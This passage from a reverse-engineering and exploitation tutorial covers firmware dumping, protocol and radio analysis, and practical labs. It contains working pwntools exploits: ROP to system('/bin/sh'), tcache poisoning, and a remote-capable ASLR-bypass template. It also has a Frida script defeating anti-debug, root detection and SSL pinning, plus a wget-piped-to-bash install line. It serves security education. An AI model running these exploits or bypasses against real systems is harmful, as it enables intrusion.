  - Tools: USB-to-UART adapter (FTDI FT232R, CP2102), screen/minicom

JTAG (Joint Test Action Group):
  - 4-5 pins: TDI, TDO, TMS, TCK, (TRST)
  - Full CPU debug access: halt, step, memory read/write
  - Boundary scan: test PCB connectivity
  - Tools: JTAGulator (pin identification), OpenOCD, J-Link
  - Finding JTAG: look for 10/14/20 pin headers, use JTAGulator

SPI Flash (Serial Peripheral Interface):
  - 4-8 pins: CLK, MOSI, MISO, CS, (HOLD, WP, VCC, GND)
  - Common chips: Winbond W25Q series, Macronix MX25L
  - In-circuit reading: clip onto chip (Pomona 5250 clip)
  - Tools: CH341A programmer, Bus Pirate, flashrom
  - Command: flashrom -p ch341a_spi -r firmware_dump.bin
```

#### Firmware Acquisition Methods

```bash
# 1. From vendor (update packages, often encrypted/signed)
# 2. From device flash memory (SPI/eMMC/NAND dump)
# 3. From bootloader over UART (U-Boot: md command)
# 4. From JTAG/SWD debug interface
# 5. From OTA update interception (MITM proxy)

# SPI flash dump via flashrom
flashrom -p ch341a_spi -r dump.bin

# eMMC dump via SD card reader (reballing or test points)
dd if=/dev/mmcblk0 of=emmc_dump.bin bs=4M

# NAND dump via OpenOCD
openocd -f interface/jlink.cfg -f target/nand.cfg
> nand dump 0 nand_dump.bin 0x0 0x4000000
```

### 9.2 Binwalk Usage

```bash
# Basic firmware scan
binwalk firmware.bin
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             uImage header, 2018-06-15
# 64            0x40            LZMA compressed data
# 1245184       0x130000        Squashfs filesystem, little endian, version 4.0

# Extract all identified components
binwalk -e firmware.bin

# Recursive extraction (extract within extracted)
binwalk -eM firmware.bin

# Entropy visualization (find encrypted/compressed regions)
binwalk -E firmware.bin

# Custom extraction rules
binwalk -D 'squashfs:squashfs:unsquashfs %e' firmware.bin

# Signature scanning with custom magic
binwalk --signature=custom_magic.mgc firmware.bin
```

#### Custom Binwalk Signatures

```python
# custom_signatures.py — for binwalk plugin
# Place in ~/.config/binwalk/magic/

# Example: detect proprietary firmware header
# Offset 0: magic "FWUP"
# Offset 4: version (uint32)
# Offset 8: payload size (uint32)  
# Offset 12: CRC32

# Magic file format:
# 0  string  FWUP  Custom Firmware Update Package
# >4 lelong  x     version %d
# >8 lelong  x     payload size %d bytes
```

### 9.3 Filesystem Extraction and Analysis

```bash
# Squashfs (most common in embedded Linux)
unsquashfs -d extracted/ squashfs_image.bin
# Examine for: /etc/shadow, /etc/passwd, hardcoded keys, backdoor accounts

# JFFS2
jefferson jffs2_image.bin -d extracted/

# UBIFS
ubireader_extract_images firmware.bin -o extracted/

# CRAMFS
fsck.cramfs --extract=extracted/ cramfs_image.bin

# Analysis priorities after extraction:
# 1. /etc/passwd, /etc/shadow — default/hardcoded credentials
# 2. /etc/ssl/, /etc/keys/ — private keys, certificates
# 3. Web interface CGI/scripts — command injection vectors
# 4. init scripts — startup services, debug features
# 5. Shared libraries — custom protocol handlers
# 6. /dev/ nodes — custom kernel modules/drivers
```

### 9.4 Protocol Reverse Engineering

```
SPI Protocol Analysis:
  - Logic analyzer capture (Saleae, DSLogic)
  - Decode MOSI (master→slave) and MISO (slave→master) separately
  - Identify command structure: opcode + address + data
  - Common opcodes: 0x03 (read), 0x02 (write), 0x05 (read status)

I2C Protocol Analysis:
  - Two wires: SDA (data) + SCL (clock)
  - Start condition → 7-bit address + R/W → ACK → data bytes → Stop
  - Identify device addresses (7-bit), register map
  - Tools: Bus Pirate, logic analyzer with I2C decoder

CAN Bus (Automotive):
  - CAN-H and CAN-L differential signaling
  - Frame: Arbitration ID (11/29 bit) + DLC + Data (0-8 bytes) + CRC
  - Tools: SocketCAN (Linux), CANtact, PCAN-USB
  - Analysis: candump, cansend, can-utils, SavvyCAN
  - Fuzzing: caringcaribou, canfuzz
```

### 9.5 Radio Protocol RE with SDR

```bash
# Software Defined Radio workflow
# Hardware: RTL-SDR ($25), HackRF ($300), BladeRF, USRP

# 1. Identify frequency and modulation
# Use SDR# (Windows) or gqrx (Linux) for spectrum analysis
# Common IoT frequencies: 315MHz, 433MHz, 868MHz, 915MHz, 2.4GHz

# 2. Capture with gnuradio or rtl_433
rtl_433 -f 433.92e6 -s 1000000 -S all  # Capture all 433MHz signals
# Or: gnuradio-companion → build receive flowgraph

# 3. Analyze modulation
inspectrum captured_signal.cf32    # Visual signal analysis
# Identify: OOK, ASK, FSK, GFSK, LoRa, Zigbee

# 4. Decode protocol
# Universal Radio Hacker (URH) — GUI tool for signal analysis
urh                                # Launch URH
# Import signal → auto-detect modulation → decode bits → find protocol structure

# 5. Replay/transmit
rpitx -m OOK -f 433920000 -s captured.bin  # Raspberry Pi transmit
hackrf_transfer -t replay.bin -f 433920000 -s 2000000  # HackRF
```

---

## 10. Practical Labs

### 10.1 Lab 1: Basic Crackme

**Objective**: Patch a serial check to always succeed.

```c
// Source (for understanding — you'd normally only have the binary)
#include <stdio.h>
#include <string.h>

int check_serial(const char *serial) {
    if (strlen(serial) != 16) return 0;
    int sum = 0;
    for (int i = 0; i < 16; i++) {
        sum += serial[i] * (i + 1);
    }
    return sum == 0x1337;
}

int main() {
    char buf[64];
    printf("Enter serial: ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    if (check_serial(buf)) {
        printf("Access granted!\n");
    } else {
        printf("Invalid serial.\n");
    }
    return 0;
}
```

**Solution approach**:

```bash
# 1. Find the comparison
$ r2 -A ./crackme
> afl | grep check
0x00401156    1     52 sym.check_serial
> pdf @ sym.check_serial
...
0x00401182    cmp eax, 0x1337
0x00401187    sete al            ; Set AL=1 if equal
0x0040118a    movzx eax, al
0x0040118d    ret
...

# 2. Patch: change sete to mov al, 1
> s 0x00401187
> wa mov al, 1
> wao nop            ; NOP remaining bytes of original sete
> q

# Or in IDA: Edit → Patch Program → Change byte
# 0F 94 C0 (sete al) → B0 01 90 (mov al, 1; nop)
```

### 10.2 Lab 2: Buffer Overflow with ROP

**Objective**: Exploit a stack overflow to execute `system("/bin/sh")`.

```python
#!/usr/bin/env python3
"""
Lab 2: ROP chain exploit
Binary: vuln_service (NX enabled, no PIE, no canary, partial RELRO)
Vulnerability: read(fd, buf, 0x200) with buf = char[128]
"""
from pwn import *

context.binary = elf = ELF('./vuln_service')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Phase 1: Leak libc address
def leak_libc():
    p = process('./vuln_service')
    
    # Offset to RIP determined via cyclic pattern
    offset = 136  # 128 buf + 8 saved RBP
    
    # ROP: puts(GOT[puts]) → main
    rop = ROP(elf)
    rop.raw(b'A' * offset)
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])
    
    p.sendline(rop.chain())
    p.recvuntil(b'Goodbye\n')  # App output before our leak
    
    leaked = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = leaked - libc.symbols['puts']
    log.success(f'libc base: {hex(libc.address)}')
    return p

# Phase 2: system("/bin/sh")
def get_shell(p):
    rop2 = ROP(libc)
    payload = b'A' * 136
    payload += p64(rop2.find_gadget(['ret']).address)  # Align stack
    payload += p64(rop2.find_gadget(['pop rdi', 'ret']).address)
    payload += p64(next(libc.search(b'/bin/sh\x00')))
    payload += p64(libc.symbols['system'])
    
    p.sendline(payload)
    p.interactive()

p = leak_libc()
get_shell(p)
```

### 10.3 Lab 3: Heap Exploitation (Tcache Poisoning)

```python
#!/usr/bin/env python3
"""
Lab 3: Tcache poisoning to arbitrary write
Binary: heap_note (glibc 2.31, Full RELRO, PIE, NX, no canary)
Menu: 1=alloc, 2=free, 3=edit, 4=show, 5=exit
Vulnerability: UAF - edit/show after free
"""
from pwn import *

context.binary = elf = ELF('./heap_note')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def alloc(idx, size, data=b'A'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvuntil(b'\n', drop=True)

p = process('./heap_note')

# Step 1: Leak heap base (for safe-linking bypass in glibc >= 2.32)
# In 2.31: no safe-linking, direct fd overwrite works
alloc(0, 0x88, b'AAAA')  # Unsorted bin size (not tcache: > 0x410 or fill tcache)
alloc(1, 0x88, b'BBBB')  # Prevent consolidation with top

free(0)                    # Goes to unsorted bin
leak = u64(show(0).ljust(8, b'\x00'))  # UAF read → fd points to main_arena
libc.address = leak - (libc.symbols['main_arena'] + 96)
log.success(f'libc: {hex(libc.address)}')

# Step 2: Tcache poisoning
alloc(2, 0x28, b'CCCC')
alloc(3, 0x28, b'DDDD')

free(2)
free(3)  # tcache[0x30]: 3 → 2

# Overwrite chunk 3's fd with __free_hook
target = libc.symbols['__free_hook']
edit(3, p64(target))  # tcache[0x30]: 3 → __free_hook

alloc(4, 0x28, b'EEEE')         # Returns chunk 3
alloc(5, 0x28, p64(libc.symbols['system']))  # Returns __free_hook → write system

# Step 3: Trigger
edit(2, b'/bin/sh\x00')
free(2)  # free(chunk_containing_"/bin/sh") → system("/bin/sh")

p.interactive()
```

### 10.4 Lab 4: Malware Unpacking

**Objective**: Unpack a UPX-packed binary and reconstruct imports.

```bash
# Step 1: Identify packing
$ diec sample.exe
Packer: UPX 3.96 [NRV2E]

# Step 2: Automatic unpack attempt
$ upx -d sample.exe -o unpacked.exe
# If UPX headers modified (anti-unpack): repair or manual unpack

# Step 3: Manual unpack in x64dbg (if UPX -d fails)
# Load sample.exe
# Set breakpoint on VirtualProtect (packer marks memory executable)
# Run → hits VirtualProtect with PAGE_EXECUTE_READWRITE
# Step out → find tail JMP (often: jmp far to low address)
# Follow the JMP → OEP reached

# Step 4: Dump with Scylla
# In x64dbg: Plugins → Scylla
# OEP: enter the OEP address you found
# IAT Autosearch → Get Imports → (verify all resolved)
# Dump → select process dump location
# Fix Dump → select the dumped file

# Step 5: Verify unpacked binary
$ diec unpacked_fixed.exe
# Should show: compiler info, no packer detected
$ strings unpacked_fixed.exe | grep -i http
# Previously hidden strings now visible
```

### 10.5 Lab 5: Firmware Analysis

```bash
# Target: Router firmware update file

# Step 1: Initial recon
$ file firmware.bin
firmware.bin: data

$ binwalk firmware.bin
DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             TRX firmware header, little endian
28            0x1C            LZMA compressed data
1572864       0x180000        Squashfs filesystem, little endian, version 4.0

# Step 2: Extract
$ binwalk -e firmware.bin
$ ls _firmware.bin.extracted/
1C.7z  180000.squashfs  squashfs-root/

# Step 3: Analyze filesystem
$ find squashfs-root/ -name "*.conf" -o -name "*.cfg" | head
squashfs-root/etc/config/wireless
squashfs-root/etc/config/network
squashfs-root/etc/passwd

$ cat squashfs-root/etc/passwd
root:$1$abc$hash_here:0:0:root:/root:/bin/ash
admin:$1$def$hash_here:0:0:admin:/tmp:/bin/ash

# Step 4: Find vulnerabilities
$ grep -rn "system\|popen\|exec" squashfs-root/www/cgi-bin/
# Look for: unsanitized user input passed to shell commands
# httpd CGI handler: /www/cgi-bin/setup.cgi

# Step 5: Identify architecture and emulate
$ file squashfs-root/bin/busybox
ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1, dynamically linked

# Emulate with QEMU user mode
$ cp $(which qemu-mipsel-static) squashfs-root/
$ chroot squashfs-root/ /qemu-mipsel-static /bin/busybox ls

# Step 6: Emulate full firmware with QEMU system (FirmAE/Firmware Analysis Toolkit)
$ python3 fat.py firmware.bin
# Boots the firmware in QEMU → network accessible for dynamic testing
```

### 10.6 Methodology Checklists

#### Static Analysis Checklist

```
□ Identify binary format (ELF/PE/Mach-O) and architecture
□ Check protections: checksec / winchecksec
□ Extract strings (strings, FLOSS)
□ Analyze imports/exports
□ Identify compiler and libraries (FLIRT, compiler signatures)
□ Map functions and call graph
□ Identify encryption/encoding routines (entropy analysis)
□ Trace data flow from input to dangerous sinks
□ Document structures and type information
□ Generate function signatures for pattern matching
```

#### Dynamic Analysis Checklist

```
□ Set up isolated analysis environment (VM/container)
□ Snapshot environment state before execution
□ Monitor filesystem changes (inotifywait, procmon)
□ Monitor network connections (tcpdump, Wireshark)
□ Monitor registry changes (Windows: procmon)
□ Trace system calls (strace/sysmon)
□ Set breakpoints at key functions (crypto, network, file I/O)
□ Extract decrypted payloads from memory
□ Record behavioral timeline
□ Compare pre/post execution state
```

#### Exploit Development Checklist

```
□ Identify vulnerability class and root cause
□ Determine reachability from attacker-controlled input
□ Map protections: ASLR, NX, canary, PIE, RELRO, CFI
□ Find information leak for ASLR bypass
□ Identify available primitives (read/write/exec)
□ Build exploitation primitive chain
□ Test reliability (% success rate)
□ Consider constraints: bad characters, size limits, timing
□ Develop PoC with minimal external dependencies
□ Document: root cause, trigger, constraints, mitigation
```

### 10.7 Tool Setup Guide

```bash
# === Linux RE Workstation Setup ===

# Pwntools + Python exploitation framework
pip3 install pwntools ropper keystone-engine capstone unicorn

# GDB + extensions
# GEF:
bash -c "$(wget -qO- https://gef.blah.cat/sh)"
# OR pwndbg:
git clone https://github.com/pwndbg/pwndbg ~/pwndbg
cd ~/pwndbg && ./setup.sh

# Ghidra (requires JDK 17+)
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0_build/ghidra_11.0_PUBLIC.zip
unzip ghidra_11.0_PUBLIC.zip
# Run: ./ghidra_11.0_PUBLIC/ghidraRun

# Radare2/Rizin
git clone https://github.com/rizinorg/rizin ~/rizin
cd ~/rizin && meson setup build && ninja -C build && sudo ninja -C build install

# Binary Ninja (commercial, trial available)
# Download from https://binary.ninja/

# Binwalk
pip3 install binwalk
# Also: apt install squashfs-tools jefferson cramfsck

# YARA
pip3 install yara-python
# apt install yara

# Frida
pip3 install frida-tools

# QEMU (for firmware emulation)
apt install qemu-user-static qemu-system-mips qemu-system-arm

# Volatility 3 (memory forensics)
pip3 install volatility3

# ROPgadget
pip3 install ROPgadget

# Seccomp tools
gem install seccomp-tools

# Docker-based analysis environments
docker pull remnux/remnux-distro     # REMnux (malware analysis)
docker pull cmnatic/rustscan          # Fast port scanning
```

---

## Appendix A: Ghidra Script — Function Similarity Hashing

```python
# @category Analysis
# @description Compute function hashes for similarity matching

import hashlib
from ghidra.program.model.block import BasicBlockModel

def hash_function(func):
    """Generate a locality-sensitive hash of function structure."""
    bbm = BasicBlockModel(currentProgram)
    blocks = bbm.getCodeBlocksContaining(func.getBody(), monitor)
    
    # Feature vector: (num_blocks, num_calls, num_branches, cyclomatic_complexity)
    num_blocks = 0
    num_calls = 0
    num_branches = 0
    edges = 0
    
    block = blocks.next() if blocks.hasNext() else None
    while block is not None:
        num_blocks += 1
        # Count successors (edges)
        succs = block.getDestinations(monitor)
        while succs.hasNext():
            edges += 1
            succs.next()
        
        # Count instructions in block
        listing = currentProgram.getListing()
        instr_iter = listing.getInstructions(block, True)
        while instr_iter.hasNext():
            instr = instr_iter.next()
            flow = instr.getFlowType()
            if flow.isCall():
                num_calls += 1
            if flow.isConditional():
                num_branches += 1
        
        block = blocks.next() if blocks.hasNext() else None
    
    # Cyclomatic complexity: E - N + 2
    complexity = edges - num_blocks + 2
    
    # Generate hash from structural features
    feature_str = f"{num_blocks}:{num_calls}:{num_branches}:{complexity}"
    func_hash = hashlib.md5(feature_str.encode()).hexdigest()[:8]
    
    return {
        'name': func.getName(),
        'addr': func.getEntryPoint(),
        'hash': func_hash,
        'blocks': num_blocks,
        'calls': num_calls,
        'complexity': complexity
    }

# Main execution
fm = currentProgram.getFunctionManager()
functions = fm.getFunctions(True)
results = []

for func in functions:
    if not func.isThunk() and func.getBody().getNumAddresses() > 10:
        result = hash_function(func)
        results.append(result)
        print(f"{result['hash']}  {result['addr']}  {result['name']}  "
              f"blocks={result['blocks']} calls={result['calls']} "
              f"cc={result['complexity']}")

print(f"\nProcessed {len(results)} functions")
```

---

## Appendix B: Exploit Template — Full ASLR Bypass

```python
#!/usr/bin/env python3
"""
Complete exploit template with ASLR bypass via information leak.
Adaptable to most stack-overflow-in-forking-server scenarios.
"""
from pwn import *
import sys

# Configuration
BINARY = './target_server'
HOST = '127.0.0.1'
PORT = 4444
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'

context.binary = elf = ELF(BINARY)
context.log_level = 'info'

if REMOTE:
    libc = ELF('./libc-remote.so.6')  # Match remote libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def conn():
    if REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)

# ============================================================
# Stage 1: Information Leak
# ============================================================
def stage1_leak():
    p = conn()
    
    OFFSET = 72  # Offset to saved RIP (determined via cyclic)
    
    # Gadgets from binary (no PIE assumed, or PIE base already known)
    POP_RDI = elf.address + 0x1273  # pop rdi; ret
    RET     = elf.address + 0x101a  # ret (stack align)
    PUTS_PLT = elf.plt['puts']
    PUTS_GOT = elf.got['puts']
    MAIN     = elf.symbols['main']
    
    # Leak puts@GOT (contains runtime libc address)
    payload = flat({
        OFFSET: [
            RET,            # Stack alignment for Ubuntu/glibc
            POP_RDI,
            PUTS_GOT,
            PUTS_PLT,
            MAIN            # Return to main for stage 2
        ]
    })
    
    p.sendlineafter(b'Input: ', payload)
    p.recvline()  # consume any intermediate output
    
    leak_bytes = p.recvline().strip()
    leaked_puts = u64(leak_bytes.ljust(8, b'\x00'))
    
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f'puts@libc:  {hex(leaked_puts)}')
    log.success(f'libc base:  {hex(libc.address)}')
    
    return p

# ============================================================
# Stage 2: Code Execution
# ============================================================
def stage2_shell(p):
    OFFSET = 72
    
    # All gadgets from libc (ASLR defeated)
    rop = ROP(libc)
    
    BIN_SH = next(libc.search(b'/bin/sh\x00'))
    SYSTEM = libc.symbols['system']
    EXIT   = libc.symbols['exit']
    POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
    RET = rop.find_gadget(['ret']).address
    
    payload = flat({
        OFFSET: [
            RET,
            POP_RDI,
            BIN_SH,
            SYSTEM,
            POP_RDI,
            0,
            EXIT
        ]
    })
    
    p.sendlineafter(b'Input: ', payload)
    
    log.success('Shell obtained!')
    p.interactive()

# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    p = stage1_leak()
    stage2_shell(p)
```

---

## Appendix C: Anti-Analysis Bypass Frida Script

```javascript
/**
 * Comprehensive anti-analysis bypass for Android/Linux targets.
 * Attach with: frida -U -f com.target.app -l bypass.js --no-pause
 */

// ===== Anti-Debug Bypass =====
Interceptor.attach(Module.findExportByName(null, "ptrace"), {
    onEnter: function(args) {
        this.request = args[0].toInt32();
    },
    onLeave: function(retval) {
        if (this.request === 0) { // PTRACE_TRACEME
            retval.replace(0);
            console.log("[*] ptrace(PTRACE_TRACEME) → 0 (bypassed)");
        }
    }
});

// ===== Timing Check Bypass =====
var original_clock_gettime = new NativeFunction(
    Module.findExportByName(null, "clock_gettime"), 'int', ['int', 'pointer']
);
var fake_time = 0;
Interceptor.replace(Module.findExportByName(null, "clock_gettime"),
    new NativeCallback(function(clk_id, tp) {
        var ret = original_clock_gettime(clk_id, tp);
        // Normalize timing to prevent timing-based detection
        fake_time += 1000000; // Increment by 1ms each call
        tp.add(0).writeU64(fake_time / 1000000000);
        tp.add(8).writeU64(fake_time % 1000000000);
        return ret;
    }, 'int', ['int', 'pointer'])
);

// ===== VM Detection Bypass =====
// Hook file access to hide VM artifacts
Interceptor.attach(Module.findExportByName(null, "open"), {
    onEnter: function(args) {
        var path = args[0].readUtf8String();
        if (path && (path.includes("qemu") || path.includes("vbox") ||
                     path.includes("vmware") || path.includes("genymotion"))) {
            console.log("[*] Blocking open(): " + path);
            args[0] = Memory.allocUtf8String("/dev/null");
        }
    }
});

// ===== Root Detection Bypass =====
var root_paths = ["/system/app/Superuser.apk", "/system/xbin/su",
                  "/system/bin/su", "/data/local/su", "/data/local/bin/su"];

Interceptor.attach(Module.findExportByName(null, "access"), {
    onEnter: function(args) {
        var path = args[0].readUtf8String();
        if (path && root_paths.some(p => path.includes(p))) {
            console.log("[*] Root check blocked: " + path);
            this.block = true;
        }
    },
    onLeave: function(retval) {
        if (this.block) retval.replace(-1);
    }
});

// ===== SSL Pinning Bypass (generic) =====
try {
    var SSL_CTX_set_verify = Module.findExportByName("libssl.so", "SSL_CTX_set_verify");
    if (SSL_CTX_set_verify) {
        Interceptor.attach(SSL_CTX_set_verify, {
            onEnter: function(args) {
                // Set verify mode to SSL_VERIFY_NONE (0)
                args[1] = ptr(0);
                console.log("[*] SSL_CTX_set_verify → SSL_VERIFY_NONE");
            }
        });
    }
} catch(e) {}

console.log("[+] Anti-analysis bypasses loaded");
```

---

## Appendix D: Quick Reference — Common Instruction Patterns

```
Pattern Recognition in Disassembly:

Function Prologue (x86-64):
  push rbp
  mov rbp, rsp
  sub rsp, <frame_size>

Function Epilogue:
  leave          ; mov rsp, rbp; pop rbp
  ret

Switch/Jump Table:
  cmp eax, <max_case>
  ja default_label
  lea rcx, [rip + jump_table]
  movsxd rax, dword [rcx + rax*4]
  add rax, rcx
  jmp rax

Virtual Function Call (C++ vtable):
  mov rax, [rdi]           ; Load vtable pointer from object
  call [rax + <offset>]    ; Call virtual function at vtable offset

Compiler-Optimized Division (x / 10):
  mov rcx, 0xCCCCCCCCCCCCCCCD
  mul rcx
  shr rdx, 3              ; Result of x/10 in RDX

Stack Canary Check:
  mov rax, [rbp - 8]
  xor rax, fs:[0x28]      ; Compare with TLS canary
  jne __stack_chk_fail

Position-Independent Code (PIC):
  lea rax, [rip + offset]  ; RIP-relative addressing

Zeroing Register:
  xor eax, eax             ; Preferred (shorter encoding than mov eax, 0)

Loop (counted):
  mov ecx, <count>
.loop:
  ; body
  dec ecx                   ; or: loop .loop (but loop is slow)
  jnz .loop

memset(buf, 0, size) optimized:
  xor eax, eax
  mov ecx, <qwords>
  rep stosq                 ; Fill RCX quadwords with RAX at [RDI]

strlen pattern:
  ; Look for: repne scasb (scan for null byte)
  ; Or: vectorized with pcmpeqb + pmovmskb

Indirect Call via Function Pointer:
  mov rax, [rbp + var_funcptr]
  call rax

System Call (Linux x86-64):
  mov eax, <syscall_number>
  syscall

System Call (Windows x86-64):
  mov r10, rcx
  mov eax, <SSN>
  syscall
```

---

## Appendix E: Recommended Learning Path

```
Phase 1 — Foundations (Weeks 1-4):
├─ Architecture: x86-64 instruction set (Intel SDM Vol 2)
├─ Binary formats: ELF internals, PE internals
├─ C/Assembly: Write programs, compile, analyze output
├─ Tools: GDB basics, objdump, readelf, file, strings
└─ Practice: Crackmes (crackmes.one, reversing.kr)

Phase 2 — Static Analysis Mastery (Weeks 5-8):
├─ IDA Pro or Ghidra proficiency
├─ Decompiler interpretation and correction
├─ Type recovery and structure reconstruction
├─ Scripting (IDAPython or Ghidra Python)
└─ Practice: Reverse CTF binaries, analyze malware samples

Phase 3 — Dynamic Analysis (Weeks 9-12):
├─ GDB + GEF/pwndbg advanced usage
├─ Frida instrumentation
├─ Tracing and system call analysis
├─ Anti-debug bypass techniques
└─ Practice: Unpack 5 different packers, analyze 3 malware families

Phase 4 — Exploitation (Weeks 13-20):
├─ Stack overflows → ret2libc → ROP chains
├─ Format string exploitation
├─ Heap exploitation (tcache, fastbin, unsorted bin)
├─ Mitigation bypasses (ASLR, canary, NX, PIE, CFI)
└─ Practice: pwnable.kr, pwnable.tw, ROP Emporium, how2heap

Phase 5 — Specialization (Weeks 21+):
├─ Choose: Malware Analysis / Exploit Dev / Firmware / Kernel
├─ Malware: real-world sample analysis, YARA authoring, unpacking
├─ Exploit: 1-day reproduction, variant analysis, 0-day research
├─ Firmware: hardware interface, embedded OS, protocol RE
├─ Kernel: driver reversing, kernel exploitation, hypervisor escapes
└─ Practice: CTF competitions, VR submissions, bug bounties
```

---

## References

- Intel 64 and IA-32 Architectures Software Developer's Manual, Volumes 1-4
- ARM Architecture Reference Manual, ARMv8 (ARM DDI 0487)
- Tool Interface Standard (TIS) ELF Specification v1.2
- Microsoft PE and COFF Specification (PE Format documentation)
- System V Application Binary Interface, AMD64 Architecture Processor Supplement
- glibc malloc internals: sourceware.org/glibc/wiki/MallocInternals
- Linux kernel source: fs/binfmt_elf.c (ELF loader), kernel/seccomp.c
- Windows Internals 7th Edition (Yosifovich, Ionescu, Russinovich, Solomon)
- Practical Malware Analysis (Sikorski, Honig)
- The Art of Exploitation, 2nd Edition (Erickson)
- Practical Binary Analysis (Andriesse)
- The Shellcoder's Handbook (Anley, Heasman, Lindner, Richarte)

---

*Document revision: 2025-05-07*
